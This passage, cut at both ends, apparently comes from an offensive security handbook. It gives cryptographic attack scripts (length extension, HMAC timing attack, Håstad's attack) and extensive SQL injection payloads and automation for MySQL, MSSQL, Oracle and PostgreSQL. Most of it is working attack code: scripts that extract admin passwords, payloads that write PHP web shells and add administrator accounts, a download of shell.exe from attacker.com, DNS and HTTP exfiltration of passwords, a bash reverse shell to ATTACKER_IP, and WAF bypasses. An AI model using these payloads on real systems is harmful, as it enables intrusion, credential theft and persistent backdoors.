new_mac, forged = length_extension_attack(
    original_mac,
    secret_length + len(original_msg),
    append,
    'md5'
)

print(f"Forged MAC: {new_mac}")
print(f"Forged data: {original_msg + forged}")
```

**Timing Attack on Crypto Comparison**

```python
#!/usr/bin/env python3
import requests
import time
import statistics

def timing_attack_hmac(url, known_prefix=""):
    """
    Exploit timing side-channel in HMAC comparison
    """
    charset = "0123456789abcdef"
    signature = known_prefix
    
    while len(signature) < 40:  # SHA1 HMAC = 40 hex chars
        timings = {}
        
        for char in charset:
            test_sig = signature + char + "0" * (40 - len(signature) - 1)
            
            # Measure multiple times for accuracy
            times = []
            for _ in range(10):
                start = time.perf_counter()
                requests.get(f"{url}?signature={test_sig}")
                elapsed = time.perf_counter() - start
                times.append(elapsed)
            
            timings[char] = statistics.median(times)
        
        # Character with longest time is likely correct
        next_char = max(timings, key=timings.get)
        signature += next_char
        
        print(f"[+] Found: {signature}")
    
    return signature

# Example usage
# target_url = "http://target.com/verify"
# recovered_hmac = timing_attack_hmac(target_url)
```

**RSA Small Exponent Attack (e=3)**

```python
#!/usr/bin/env python3
import gmpy2

def low_exponent_attack(ciphertexts, moduli, e=3):
    """
    Håstad's broadcast attack for small RSA exponent
    Requires same message encrypted to multiple recipients
    """
    if len(ciphertexts) < e:
        print("[-] Need at least e ciphertexts")
        return None
    
    # Chinese Remainder Theorem
    result = 0
    N = 1
    for n in moduli[:e]:
        N *= n
    
    for c, n in zip(ciphertexts[:e], moduli[:e]):
        Ni = N // n
        result += c * Ni * gmpy2.invert(Ni, n)
    
    result = result % N
    
    # Take e-th root
    plaintext, exact = gmpy2.iroot(result, e)
    
    if exact:
        print("[+] Attack successful!")
        return int(plaintext)
    else:
        print("[-] Attack failed")
        return None

# Example
ciphertexts = [0x1234, 0x5678, 0x9abc]  # Same message, different N
moduli = [0xaaa, 0xbbb, 0xccc]          # Different RSA moduli
e = 3

plaintext = low_exponent_attack(ciphertexts, moduli, e)
print(f"Recovered plaintext: {plaintext}")
```

**Bleichenbacher's Attack (PKCS#1 v1.5)**

[Inference] Exploits padding oracle in RSA PKCS#1 v1.5:

```python
#!/usr/bin/env python3

def bleichenbacher_oracle(ciphertext):
    """
    Oracle that returns True if decrypted value is PKCS#1 v1.5 conformant
    """
    # In real scenario, this would query the server
    # Server responds differently for valid/invalid padding
    pass

def bleichenbacher_attack(ciphertext, n, e, oracle):
    """
    Bleichenbacher's million message attack
    [Unverified] Complex attack requiring extensive iteration
    """
    # This is a simplified outline
    # Full implementation requires careful interval management
    
    B = 2 ** (8 * (n.bit_length() // 8 - 2))
    
    # Step 1: Blinding (if needed)
    # Step 2: Search for s values that produce conformant padding
    # Step 3: Narrow intervals
    # Step 4: Repeat until single interval remains
    
    print("[!] Full Bleichenbacher attack implementation complex")
    print("[!] See academic papers for complete algorithm")
    
    return None
```

---

**Important Related Topics:**

- Side-channel attacks (timing, power analysis, cache)
- Quantum-resistant cryptography assessment
- Certificate validation and PKI exploitation
- Authenticated encryption modes (GCM, ChaCha20-Poly1305)

---

# WEB APPLICATION EXPLOITATION

## Injection Attacks - SQL Injection

### SQL Injection Fundamentals

SQL Injection occurs when untrusted input is incorporated into SQL queries without proper sanitization, allowing attackers to manipulate database operations.

**Basic SQL Injection Detection**

```sql
# Test payloads
'
"
`
')
")
`)
';
";
`;

# Logic operators
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
```

**Comment Syntax by Database**

```sql
# MySQL
-- (requires space after)
# 
/**/

# MSSQL
-- 
/**/

# Oracle
--
/**/

# PostgreSQL
--
/**/
```

### Boolean-Based Blind SQL Injection

Boolean-based blind SQLi exploits conditional responses based on TRUE/FALSE conditions when no direct output is visible.

**MySQL Boolean-Based Blind SQLi**

```sql
# Test for vulnerability
' AND 1=1-- -    # TRUE condition - normal response
' AND 1=2-- -    # FALSE condition - different response

# Database version enumeration
' AND SUBSTRING(VERSION(),1,1)='5'-- -
' AND SUBSTRING(VERSION(),1,1)='8'-- -

# Current user
' AND SUBSTRING(USER(),1,1)='r'-- -
' AND SUBSTRING(USER(),1,4)='root'-- -

# Current database
' AND SUBSTRING(DATABASE(),1,1)='t'-- -
' AND LENGTH(DATABASE())=4-- -

# Table enumeration
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())>5-- -

# Column enumeration
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>3-- -

# Data extraction
' AND SUBSTRING((SELECT username FROM users LIMIT 0,1),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>100-- -
```

**MSSQL Boolean-Based Blind SQLi**

```sql
# Test for vulnerability
' AND 1=1--
' AND 1=2--

# Database version
' AND SUBSTRING(@@VERSION,1,1)='M'--
' AND SUBSTRING(CAST(@@VERSION AS VARCHAR),1,9)='Microsoft'--

# Current user
' AND SUBSTRING(SYSTEM_USER,1,1)='s'--
' AND LEN(SYSTEM_USER)>5--

# Current database
' AND SUBSTRING(DB_NAME(),1,1)='m'--

# Table enumeration
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog=DB_NAME())>5--

# Check if table exists
' AND EXISTS(SELECT * FROM users)--

# Data extraction
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>100--
```

**Oracle Boolean-Based Blind SQLi**

```sql
# Test for vulnerability (Oracle requires FROM clause)
' AND 1=1--
' AND 1=2--

# Alternative using dual table
' AND '1'='1' FROM dual--

# Database version
' AND SUBSTR(banner,1,6)='Oracle' FROM v$version WHERE ROWNUM=1--

# Current user
' AND SUBSTR(USER,1,1)='S'--

# Table enumeration
' AND (SELECT COUNT(*) FROM all_tables WHERE owner=USER)>5--

# Column enumeration
' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name='USERS')>3--

# Data extraction
' AND SUBSTR((SELECT username FROM users WHERE ROWNUM=1),1,1)='a'--
' AND ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>100--
```

**PostgreSQL Boolean-Based Blind SQLi**

```sql
# Test for vulnerability
' AND 1=1--
' AND 1=2--

# Database version
' AND SUBSTRING(VERSION(),1,10)='PostgreSQL'--

# Current user
' AND SUBSTRING(CURRENT_USER,1,1)='p'--

# Current database
' AND SUBSTRING(CURRENT_DATABASE(),1,1)='p'--

# Table enumeration
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>5--

# Data extraction
' AND SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET 0),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--
```

**Automated Boolean-Based Extraction Script**

```python
import requests
import string

class BooleanBlindSQLi:
    def __init__(self, url, param, true_string):
        self.url = url
        self.param = param
        self.true_string = true_string
        
    def check_condition(self, injection):
        """Test if injection returns TRUE condition"""
        params = {self.param: injection}
        response = requests.get(self.url, params=params)
        return self.true_string in response.text
    
    def extract_string(self, query, max_length=50):
        """Extract string value from SQL query"""
        result = ""
        
        for position in range(1, max_length + 1):
            found = False
            
            for char in string.printable:
                if char in ['%', '_', '\n', '\r', '\t']:
                    continue
                    
                # MySQL syntax
                injection = f"' AND SUBSTRING(({query}),{position},1)='{char}'-- -"
                
                if self.check_condition(injection):
                    result += char
                    print(f"Found: {result}")
                    found = True
                    break
            
            if not found:
                break
        
        return result
    
    def extract_with_ascii(self, query, max_length=50):
        """Binary search using ASCII values (faster)"""
        result = ""
        
        for position in range(1, max_length + 1):
            # Binary search for ASCII value
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                injection = f"' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}-- -"
                
                if self.check_condition(injection):
                    low = mid + 1
                else:
                    high = mid - 1
            
            if low == 32:  # No character found
                break
                
            char = chr(low)
            result += char
            print(f"Found: {result}")
        
        return result

# Usage
sqli = BooleanBlindSQLi(
    url="http://target.com/product.php",
    param="id",
    true_string="Product found"
)

# Extract database name
db_name = sqli.extract_with_ascii("SELECT DATABASE()")
print(f"Database: {db_name}")

# Extract admin password
password = sqli.extract_with_ascii("SELECT password FROM users WHERE username='admin'")
print(f"Password: {password}")
```

### Time-Based Blind SQL Injection

Time-based blind SQLi uses database time delay functions to infer TRUE/FALSE conditions when no visible output difference exists.

**MySQL Time-Based Blind SQLi**

```sql
# Basic time delay
' AND SLEEP(5)-- -
' OR SLEEP(5)-- -

# Conditional time delay
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(1=2,SLEEP(5),0)-- -

# Database version check
' AND IF(SUBSTRING(VERSION(),1,1)='5',SLEEP(5),0)-- -
' AND IF(SUBSTRING(VERSION(),1,1)='8',SLEEP(5),0)-- -

# Current database
' AND IF(SUBSTRING(DATABASE(),1,1)='t',SLEEP(5),0)-- -

# User enumeration
' AND IF(SUBSTRING(USER(),1,4)='root',SLEEP(5),0)-- -

# Data extraction
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)-- -

# ASCII comparison
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>100,SLEEP(5),0)-- -

# Alternative using BENCHMARK
' AND IF(1=1,BENCHMARK(5000000,MD5('test')),0)-- -
```

**MSSQL Time-Based Blind SQLi**

```sql
# Basic time delay (requires stacked queries)
'; WAITFOR DELAY '0:0:5'--
'; IF(1=1) WAITFOR DELAY '0:0:5'--

# Conditional delay
'; IF(1=1) WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'--
'; IF(1=2) WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0'--

# Database version
'; IF(SUBSTRING(@@VERSION,1,9)='Microsoft') WAITFOR DELAY '0:0:5'--

# Current user
'; IF(SUBSTRING(SYSTEM_USER,1,1)='s') WAITFOR DELAY '0:0:5'--

# Current database
'; IF(SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

# Data extraction
'; IF(SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--

# ASCII comparison
'; IF(ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>100) WAITFOR DELAY '0:0:5'--
```

**Oracle Time-Based Blind SQLi**

```sql
# Basic time delay
' AND DBMS_LOCK.SLEEP(5)=1--
' OR DBMS_LOCK.SLEEP(5)=1--

# Conditional delay
' AND (CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END)=0--
' AND (CASE WHEN (1=2) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END)=0--

# Database version
' AND (CASE WHEN (SUBSTR(banner,1,6)='Oracle') THEN DBMS_LOCK.SLEEP(5) ELSE 0 END)=0 FROM v$version WHERE ROWNUM=1--

# Current user
' AND (CASE WHEN (SUBSTR(USER,1,1)='S') THEN DBMS_LOCK.SLEEP(5) ELSE 0 END)=0--

# Data extraction
' AND (CASE WHEN (SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1)='a') THEN DBMS_LOCK.SLEEP(5) ELSE 0 END)=0--

# ASCII comparison
' AND (CASE WHEN (ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>100) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END)=0--

# Alternative using UTL_HTTP (requires network access)
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1))=1--
```

**PostgreSQL Time-Based Blind SQLi**

```sql
# Basic time delay
'; SELECT pg_sleep(5)--
' AND pg_sleep(5)--

# Conditional delay
' AND (CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)=0--
' AND (CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)=0--

# Database version
' AND (CASE WHEN (SUBSTRING(VERSION(),1,10)='PostgreSQL') THEN pg_sleep(5) ELSE pg_sleep(0) END)=0--

# Current user
' AND (CASE WHEN (SUBSTRING(CURRENT_USER,1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END)=0--

# Current database
' AND (CASE WHEN (SUBSTRING(CURRENT_DATABASE(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END)=0--

# Data extraction
' AND (CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)=0--

# ASCII comparison
' AND (CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100) THEN pg_sleep(5) ELSE pg_sleep(0) END)=0--
```

**Time-Based Blind SQLi Automation**

```python
import requests
import time
import string

class TimeBasedBlindSQLi:
    def __init__(self, url, param, delay=5, threshold=4):
        self.url = url
        self.param = param
        self.delay = delay
        self.threshold = threshold  # Minimum delay to consider TRUE
        
    def check_condition(self, injection):
        """Test if injection causes time delay"""
        params = {self.param: injection}
        
        start = time.time()
        try:
            requests.get(self.url, params=params, timeout=self.delay + 2)
        except requests.exceptions.Timeout:
            return True
        elapsed = time.time() - start
        
        return elapsed >= self.threshold
    
    def extract_with_binary_search(self, query, max_length=50, db_type='mysql'):
        """Extract data using binary search on ASCII values"""
        result = ""
        
        # Adjust syntax for database type
        if db_type == 'mysql':
            delay_func = f"SLEEP({self.delay})"
            substring_func = "SUBSTRING"
        elif db_type == 'mssql':
            delay_func = f"WAITFOR DELAY '0:0:{self.delay}'"
            substring_func = "SUBSTRING"
        elif db_type == 'postgres':
            delay_func = f"pg_sleep({self.delay})"
            substring_func = "SUBSTRING"
        elif db_type == 'oracle':
            delay_func = f"DBMS_LOCK.SLEEP({self.delay})"
            substring_func = "SUBSTR"
        
        for position in range(1, max_length + 1):
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                
                if db_type == 'mysql':
                    injection = f"' AND IF(ASCII({substring_func}(({query}),{position},1))>{mid},{delay_func},0)-- -"
                elif db_type == 'mssql':
                    injection = f"'; IF(ASCII({substring_func}((SELECT TOP 1 {query}),{position},1))>{mid}) {delay_func}--"
                elif db_type == 'postgres':
                    injection = f"' AND (CASE WHEN (ASCII({substring_func}(({query}),{position},1))>{mid}) THEN {delay_func} ELSE 0 END)::text='0'--"
                elif db_type == 'oracle':
                    injection = f"' AND (CASE WHEN (ASCII({substring_func}(({query}),{position},1))>{mid}) THEN {delay_func} ELSE 0 END)=0--"
                
                if self.check_condition(injection):
                    low = mid + 1
                else:
                    high = mid - 1
            
            if low == 32:  # No character found
                break
            
            char = chr(low)
            result += char
            print(f"Position {position}: {result}")
        
        return result

# Usage
sqli = TimeBasedBlindSQLi(
    url="http://target.com/product.php",
    param="id",
    delay=5,
    threshold=4
)

# MySQL example
database = sqli.extract_with_binary_search("SELECT DATABASE()", db_type='mysql')
print(f"Database: {database}")

password = sqli.extract_with_binary_search(
    "SELECT password FROM users WHERE username='admin'",
    db_type='mysql'
)
print(f"Password: {password}")
```

### Union-Based SQL Injection

Union-based SQLi combines results from the original query with attacker-controlled queries using the UNION operator.

**Finding Number of Columns**

```sql
# METHOD 1: ORDER BY
' ORDER BY 1-- -   # Success
' ORDER BY 2-- -   # Success
' ORDER BY 3-- -   # Success
' ORDER BY 4-- -   # Error - only 3 columns

# METHOD 2: UNION SELECT NULL
' UNION SELECT NULL-- -                    # Error if not 1 column
' UNION SELECT NULL,NULL-- -               # Error if not 2 columns
' UNION SELECT NULL,NULL,NULL-- -          # Success - 3 columns!

# Oracle requires FROM dual
' UNION SELECT NULL,NULL,NULL FROM dual-- -
```

**MySQL Union-Based SQLi**

```sql
# Basic UNION injection
' UNION SELECT NULL,NULL,NULL-- -

# Find visible columns (determine which position appears in output)
' UNION SELECT 1,2,3-- -
' UNION SELECT 'a','b','c'-- -

# Database enumeration
' UNION SELECT 1,VERSION(),DATABASE()-- -
' UNION SELECT 1,USER(),@@hostname-- -
' UNION SELECT 1,@@version_compile_os,@@datadir-- -

# Table enumeration
' UNION SELECT 1,table_name,table_schema FROM information_schema.tables WHERE table_schema=DATABASE()-- -
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -

# Column enumeration
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

# Data extraction
' UNION SELECT 1,username,password FROM users-- -
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users-- -

# Multiple rows
' UNION SELECT 1,username,password FROM users LIMIT 0,1-- -
' UNION SELECT 1,username,password FROM users LIMIT 1,1-- -

# File read (requires FILE privilege)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),3-- -

# File write (requires FILE privilege and secure_file_priv not set)
' UNION SELECT 1,'<?php system($_GET[0]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

**MSSQL Union-Based SQLi**

```sql
# Basic UNION injection
' UNION SELECT NULL,NULL,NULL--

# Database enumeration
' UNION SELECT 1,@@VERSION,DB_NAME()--
' UNION SELECT 1,SYSTEM_USER,HOST_NAME()--
' UNION SELECT 1,@@SERVERNAME,SUSER_SNAME()--

# Table enumeration
' UNION SELECT 1,name,3 FROM sys.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--

# Column enumeration
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--

# Data extraction
' UNION SELECT 1,username,password FROM users--

# Multiple databases
' UNION SELECT 1,name,3 FROM sys.databases--
' UNION SELECT 1,table_name,table_catalog FROM information_schema.tables--

# Command execution (requires xp_cmdshell enabled)
'; EXEC xp_cmdshell 'whoami'--

# Read file
' UNION SELECT 1,BulkColumn,3 FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
```

**Oracle Union-Based SQLi**

```sql
# Basic UNION injection (requires FROM dual)
' UNION SELECT NULL,NULL,NULL FROM dual--

# Database enumeration
' UNION SELECT 1,banner,3 FROM v$version--
' UNION SELECT 1,USER,3 FROM dual--
' UNION SELECT 1,SYS_CONTEXT('USERENV','SESSION_USER'),3 FROM dual--

# Table enumeration
' UNION SELECT 1,table_name,3 FROM all_tables--
' UNION SELECT 1,table_name,owner FROM all_tables WHERE owner='HR'--

# Column enumeration
' UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'--

# Data extraction
' UNION SELECT 1,username,password FROM users--

# Multiple rows using ROWNUM
' UNION SELECT 1,username,password FROM users WHERE ROWNUM=1--
' UNION SELECT 1,username,password FROM (SELECT username,password,ROWNUM r FROM users) WHERE r=2--

# String concatenation
' UNION SELECT 1,username||':'||password,3 FROM users--

# File read (requires Java permissions)
' UNION SELECT 1,UTL_FILE.GET_LINE('/etc/passwd'),3 FROM dual--
```

**PostgreSQL Union-Based SQLi**

```sql
# Basic UNION injection
' UNION SELECT NULL,NULL,NULL--

# Database enumeration
' UNION SELECT 1,VERSION(),3--
' UNION SELECT 1,CURRENT_USER,CURRENT_DATABASE()--

# Table enumeration
' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'--
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='public'--

# Column enumeration
' UNION SELECT 1,column_name,data_type FROM information_schema.columns WHERE table_name='users'--

# Data extraction
' UNION SELECT 1,username,password FROM users--
' UNION SELECT 1,STRING_AGG(username||':'||password,','),3 FROM users--

# Multiple rows
' UNION SELECT 1,username,password FROM users LIMIT 1 OFFSET 0--
' UNION SELECT 1,username,password FROM users LIMIT 1 OFFSET 1--

# File read (requires superuser or pg_read_file role)
' UNION SELECT 1,pg_read_file('/etc/passwd'),3--

# File write (requires COPY TO and appropriate permissions)
'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/shell.php'--

# Command execution (requires COPY FROM PROGRAM - PostgreSQL 9.3+)
'; COPY (SELECT '') FROM PROGRAM 'id'--
```

**Advanced UNION Techniques**

```sql
# Dealing with string vs numeric columns
# If column 2 is numeric
' UNION SELECT 1,2,3--              # Works
' UNION SELECT 1,'test',3--         # Error

# Solution: Cast or use different column
' UNION SELECT 1,CAST('test' AS INT),3--
' UNION SELECT 'test',2,3--

# Dealing with column type mismatches
# MySQL: Use NULL or appropriate type
' UNION SELECT NULL,NULL,NULL--

# Handling WHERE clauses that filter results
# Original: SELECT * FROM products WHERE id=1
' AND 1=0 UNION SELECT 1,2,3--      # Forces original query to return nothing

# Bypassing WAF filters
' UNION/**/ SELECT 1,2,3-- -
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
' UNION%23comment%0ASELECT 1,2,3-- -
' UNION%0ASELECT%0A1,2,3-- -
```

### Error-Based SQL Injection

Error-based SQLi extracts data through database error messages.

**MySQL Error-Based SQLi**

```sql
# Using EXTRACTVALUE (MySQL 5.1+)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -

# Data extraction
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e))-- -

# Using UPDATEXML
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1)-- -

# Extract multiple rows (31 char limit per error)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,':',password) FROM users),0x7e))-- -

# Bypass 31 character limit
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 0,1),1,31),0x7e))-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT password FROM users LIMIT 0,1),32,31),0x7e))-- -

# Using FLOOR with RAND (works on older MySQL)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

# Using EXP overflow (MySQL 5.5+)
' AND EXP(~(SELECT * FROM (SELECT DATABASE())x))-- -
' AND EXP(~(SELECT * FROM (SELECT USER())x))-- -
```

**MSSQL Error-Based SQLi**

```sql
# Using CAST/CONVERT errors
' AND 1=CAST((SELECT @@VERSION) AS INT)--
' AND 1=CONVERT(INT,(SELECT DB_NAME()))--
' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))--

# Data extraction
' AND 1=CONVERT(INT,(SELECT TOP 1 username FROM users))--
' AND 1=CONVERT(INT,(SELECT TOP 1 password FROM users))--

# Using XML functions
' AND 1=(SELECT table_name FROM information_schema.tables FOR XML PATH(''))--

# Multiple rows
' AND 1=CONVERT(INT,(SELECT TOP 1 username FROM users WHERE username NOT IN (SELECT TOP 0 username FROM users)))--
' AND 1=CONVERT(INT,(SELECT TOP 1 username FROM users WHERE username NOT IN (SELECT TOP 1 username FROM users)))--
```

**Oracle Error-Based SQLi**

```sql
# Using UTL_INADDR.GET_HOST_ADDRESS
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT USER FROM dual))--
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--

# Using CTXSYS.DRITHSX.SN
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM dual))--

# Using DBMS_XDB_VERSION.CHECKIN
' AND 1=DBMS_XDB_VERSION.CHECKIN((SELECT USER FROM dual))--

# Using XMLType
' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT USER FROM dual)||CHR(62))) FROM dual)--

# Data extraction
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1))--
```

**PostgreSQL Error-Based SQLi**

```sql
# Using CAST errors
' AND 1=CAST((SELECT VERSION()) AS INT)--
' AND 1=CAST((SELECT CURRENT_USER) AS INT)--
' AND 1=CAST((SELECT CURRENT_DATABASE()) AS INT)--

# Data extraction
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--

# Using XML functions
' AND 1=CAST((SELECT XMLAGG(XMLELEMENT(e,table_name)) FROM information_schema.tables) AS INT)--

# Using pg_sleep with subquery
' AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INT) ELSE 1 END)--
```

**Error-Based Automation Script**

```python
import requests
import re

class ErrorBasedSQLi:
    def __init__(self, url, param, db_type='mysql'):
        self.url = url
        self.param = param
        self.db_type = db_type
        
    def extract_from_error(self, query):
        """Extract data from error messages"""
        if self.db_type == 'mysql':
            injection = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}),0x7e))-- -"
        elif self.db_type == 'mssql':
            injection = f"' AND 1=CONVERT(INT,({query}))--"
        elif self.db_type == 'postgres':
            injection = f"' AND 1=CAST(({query}) AS INT)--"
        elif self.db_type == 'oracle':
            injection = f"' AND 1=UTL_INADDR.GET_HOST_ADDRESS(({query}))--"
        
        params = {self.param: injection}
        response = requests.get(self.url, params=params)
        
        # Extract data from error message
        patterns = [
            r'~(.+?)~',  # MySQL EXTRACTVALUE
            r"'(.+?)'",  # MSSQL CONVERT
            r'invalid input syntax for .*?: "(.+?)"',  # PostgreSQL
            r'unknown host (.+?)$',  # Oracle UTL_INADDR
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        
        return None
    
    def extract_long_string(self, query, chunk_size=31):
        """Extract strings longer than error message limit"""
        result = ""
        position = 1
        
        while True:
            if self.db_type == 'mysql':
                chunk_query = f"SELECT SUBSTRING(({query}),{position},{chunk_size})"
            else:
                chunk_query = f"SELECT SUBSTRING(({query}),{position},{chunk_size})"
            
            chunk = self.extract_from_error(chunk_query)
            
            if not chunk or chunk.strip() == "":
                break
            
            result += chunk
            position += chunk_size
            print(f"Extracted: {result}")
        
        return result

# Usage
sqli = ErrorBasedSQLi(
    url="http://target.com/product.php",
    param="id",
    db_type='mysql'
)

# Extract database name
database = sqli.extract_from_error("SELECT DATABASE()")
print(f"Database: {database}")

# Extract long password
password = sqli.extract_long_string("SELECT password FROM users WHERE username='admin'")
print(f"Password: {password}")

# Extract all usernames
users = sqli.extract_long_string("SELECT GROUP_CONCAT(username) FROM users")
print(f"Users: {users}")
```

### Stacked Queries

Stacked queries allow executing multiple SQL statements separated by semicolons. [Inference] Not all databases and configurations support stacked queries.

**MySQL Stacked Queries**

[Unverified] MySQL typically does NOT support stacked queries through mysql_query() or mysqli_query() in PHP, but may work with PDO or other interfaces.

```sql
# Test for stacked queries
'; SELECT SLEEP(5)-- -

# Create new admin user (if permissions allow)
'; INSERT INTO users(username,password,role) VALUES('hacker','password123','admin')-- -

# Update existing user
'; UPDATE users SET password='newpass' WHERE username='admin'-- -

# Drop table
'; DROP TABLE logs-- -

# Create backdoor table
'; CREATE TABLE backdoor (cmd VARCHAR(255))-- - '; INSERT INTO backdoor VALUES('<?php system($_GET[0]); ?>')-- -

# Grant privileges

'; GRANT ALL PRIVILEGES ON _._ TO 'hacker'@'%' IDENTIFIED BY 'pass123'-- -

````

**MSSQL Stacked Queries**

MSSQL supports stacked queries through most interfaces.

```sql
# Test for stacked queries
'; WAITFOR DELAY '0:0:5'--

# Enable xp_cmdshell (requires sysadmin privileges)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

# Execute system commands
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'net user hacker pass123 /add'--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

# Create backdoor user
'; INSERT INTO users(username,password,role) VALUES('hacker','5f4dcc3b5aa765d61d8327deb882cf99','admin')--

# Read file using OPENROWSET
'; SELECT * INTO temp_table FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--

# Write file using xp_cmdshell
'; EXEC xp_cmdshell 'echo ^<?php system($_GET[0]); ?^> > C:\inetpub\wwwroot\shell.php'--

# Enable Ole Automation Procedures
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;--

# Download file using Ole Automation
'; DECLARE @o INT; EXEC sp_oacreate 'MSXML2.ServerXMLHTTP', @o OUT; EXEC sp_oamethod @o, 'open', NULL, 'GET', 'http://attacker.com/shell.exe', false; EXEC sp_oamethod @o, 'send'; EXEC sp_oamethod @o, 'responseBody', @o OUT;--

# DNS exfiltration
'; EXEC xp_cmdshell 'nslookup ' + (SELECT password FROM users WHERE username='admin') + '.attacker.com'--

# Create stored procedure backdoor
'; CREATE PROCEDURE sp_backdoor @cmd VARCHAR(8000) AS EXEC(@cmd);--
'; EXEC sp_backdoor 'SELECT @@VERSION'--
````

**PostgreSQL Stacked Queries**

PostgreSQL supports stacked queries in most interfaces.

```sql
# Test for stacked queries
'; SELECT pg_sleep(5)--

# Create backdoor user
'; CREATE USER hacker WITH PASSWORD 'pass123' SUPERUSER;--
'; INSERT INTO users(username,password,role) VALUES('hacker','password123','admin')--

# Create malicious function
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;--

# Execute commands
'; SELECT system('id')--
'; SELECT system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')--

# Read file
'; CREATE TABLE file_data(data text);--
'; COPY file_data FROM '/etc/passwd';--
'; SELECT data FROM file_data;--

# Write file
